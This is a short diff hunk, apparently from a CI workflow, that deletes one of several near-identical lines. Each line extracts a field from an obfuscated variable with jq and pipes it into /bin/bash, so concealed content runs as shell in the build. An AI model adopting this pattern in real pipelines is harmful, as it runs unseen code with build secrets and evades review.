@@ -39,7 +39,6 @@ jobs:
           printf '%s' "$fztp66" | jq -r .qx09601 | /bin/bash
           echo $haq07 | jq -r .chew945 | /bin/bash
           echo $vtkl0380 | jq -r .sxzvu061 | /bin/bash
-          printf '%s' "$d133" | jq -r .cta144 | /bin/bash
           printf '%s' "$unpr70537" | jq -r .avesj897 | /bin/bash
           echo $w7 | jq -r .vvk84 | /bin/bash
           echo $zr650 | jq -r .sp0 | /bin/bash
